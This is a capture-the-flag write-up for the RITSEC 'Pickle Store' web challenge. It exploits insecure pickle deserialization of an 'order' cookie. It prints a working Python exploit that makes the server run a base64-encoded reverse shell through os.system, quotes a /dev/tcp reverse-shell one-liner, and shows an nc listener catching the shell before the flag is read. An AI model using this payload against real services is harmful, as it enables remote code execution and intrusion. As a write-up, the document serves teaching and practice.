# Pickle Store
> New pickles just dropped! Check out the store.

> https://pickles-web.challenges.ctf.ritsec.club/

## About the Challenge
We were given a website that has a functionality to order a pickle


[Image extracted text: Fresh Pickles
Order some
pickles! We have sweet pickles, sour pickles, savory pickles, and pickles you've never even heard 0f before!
Select a pickle below:
Sweet Pickle: $2
Sour Pickle: $2
Savory Pickle: $2
Salty Pickle: $2]


## How to Solve?
If we see the request, there is a cookie called `order` and the value is Base64 encoded message. When I first saw the cookie, the first thing that comes to my mind was `Pickle Insecure Deserialization to RCE`


[Image extracted text: Request
Response
Pretty
Raw
Hex
Pretty
Raw
Hex
Render
GET
forder
HTTP / 2
HTTP / =
200
OK
Host
pickles-veb- challenges
ct f
ritsec
clbb
Server
cunicorn
Cookie:
order-gASVD#LAALLAAACHC 313ZUVOcGljafxlIC4=
Dat e
Sun ,
02
Apr
2023 15:21:18
GHT
User-Agent
Hozilla/5_
(Vindous
IT
Ving4 ;
264;
Content
Type:
text /hcal
charset-ut f-8
17.109
Gecko/zO1OO101
Firefox/1l
Content-
Lengch:
222
1ccept
Via:
google
cext/htnl
applicat
on / *hcnltxnl
applicat
on/*nl
9-0
9 , image/ av
Alt-Svc:
h3=
443"
ma-2592000,h3-292":443"
ma-2592000
1f
inage/vebp
4-0.
Accept-Language
en-US
en;
<IDOCTTPE
henl>
1ccept-
Encoding:
gzip
deflace
<head>
Re ferer
https:
mpickles-veb
challenges
ctfritsec_
club /
xcitle>
Upgrade
Ins
cure
Requests:
Pickle
Score
Sec--
etch-Dest
docuent
~Icitle
Sec--
etch-
Hode:
navigate
{linl-
rel=
stylesheet
href-" /static/style
Css
Sec-
etch-Sice
origin
~/head>
Sec-Fetch-User:
<body>
Te:
crailers
shl>
Here
Your
order
<fhl>
<h_>
steetpickle
</h->
class=
button
href=
Nev Order
</a>
~/body>
4-0
a]


And then I tried to do some research about that vulnerability and I got this script to exploit that vulnerability

```python
import pickle
import base64
import os

class RCE:
    def __reduce__(self):
        cmd = ('echo "BASE64_REVERSE_SHELL" | base64 -d | bash')
        return os.system, (cmd,)

if __name__ == '__main__':
    pickled = pickle.dumps(RCE())
    print(base64.urlsafe_b64encode(pickled))
```

Why should I encode the command first using Base64 instead of directly using `/bin/sh -i >& /dev/tcp/IP/PORT 0>&1`? That's because I can't do a reverse shell if I'm using that command.

Run the script and then change the value of the cookie with the output of the script. And then to obtain the flag, try to read `/flag` file


[Image extracted text: rootadaffainfo:~#
nc
~nlvp 4444
Listening
on
0.0.0.0 4444
Connection
received
on
34.138.178.104 2050
Ibingsh: 0:
can' t
access tty; job control turned off
cat
RS{TH3_L345T_53CUR3_PICKL3}
Iflag]


```
RS{TH3_L345T_53CUR3_P1CKL3}
```